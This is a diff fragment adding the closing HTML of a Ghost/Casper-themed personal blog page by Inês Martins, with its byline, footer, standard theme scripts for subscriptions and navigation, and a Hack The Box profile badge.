+                        <img class="author-profile-image" src="/content/images/size/w100/2020/07/0PFUtbOg_400x400.jpg" alt="Inês Martins" />
+                    </a>
+                </li>
+            </ul>
+            <div class="post-card-byline-content">
+                <span><a href="/author/ines/">Inês Martins</a></span>
+                <span class="post-card-byline-date"><time datetime="2020-10-22">22 Oct 2020</time> <span class="bull">&bull;</span> 9 min read</span>
+            </div>
+        </footer>
+
+    </div>
+
+</article>
+        </div>
+    </div>
+</aside>
+
+
+
+
+        <footer class="site-footer outer">
+            <div class="site-footer-content inner">
+                <section class="copyright"><a href="https://inesmartins.github.io/">Inês Martins</a> &copy; 2020</section>
+                <nav class="site-footer-nav">
+                    <a href="https://inesmartins.github.io/">Latest Posts</a>
+                    
+                    <a href="https://twitter.com/inesmartns" target="_blank" rel="noopener">Twitter</a>
+                    <a href="https://ghost.org" target="_blank" rel="noopener">Ghost</a>
+                </nav>
+            </div>
+        </footer>
+
+    </div>
+
+
+    <script
+        src="https://code.jquery.com/jquery-3.4.1.min.js"
+        integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo="
+        crossorigin="anonymous">
+    </script>
+    <script src="/assets/built/casper.js?v=a7e4dafcdc"></script>
+
+    <script>
+        // Parse the URL parameter
+        function getParameterByName(name, url) {
+            if (!url) url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        }
+
+        // Give the parameter a variable name
+        var action = getParameterByName('action');
+
+        $(document).ready(function () {
+            if (action == 'subscribe') {
+                $('body').addClass("subscribe-success");
+            }
+
+            $('.subscribe-success-message .subscribe-close').click(function () {
+                $('.subscribe-success-message').addClass('close');
+            });
+
+            // Reset form on opening subscrion overlay
+            $('.subscribe-button').click(function() {
+                $('.subscribe-overlay form').removeClass();
+                $('.subscribe-email').val('');
+            });
+        });
+    </script>
+
+    <script>
+    $(document).ready(function () {
+        // FitVids - start
+        var $postContent = $(".post-full-content");
+        $postContent.fitVids();
+        // FitVids - end
+
+        // Replace nav with title on scroll - start
+        Casper.stickyNavTitle({
+            navSelector: '.site-nav-main',
+            titleSelector: '.post-full-title',
+            activeClass: 'nav-post-title-active'
+        });
+        // Replace nav with title on scroll - end
+
+        // Hover on avatar
+        var hoverTimeout;
+        $('.author-list-item').hover(function () {
+            var $this = $(this);
+
+            clearTimeout(hoverTimeout);
+
+            $('.author-card').removeClass('hovered');
+            $(this).children('.author-card').addClass('hovered');
+
+        }, function () {
+            var $this = $(this);
+
+            hoverTimeout = setTimeout(function () {
+                $this.children('.author-card').removeClass('hovered');
+            }, 800);
+        });
+    });
+</script>
+
+
+    <div class="site-footer outer" style="background:#090a0b;margin-top:-60px;">
+    <div class="site-footer-content footer inner" style="margin-bottom:-20px">
+        <script src="https://www.hackthebox.eu/badge/172261"></script>
+    </div>
+</div>
+
+</body>
+</html>
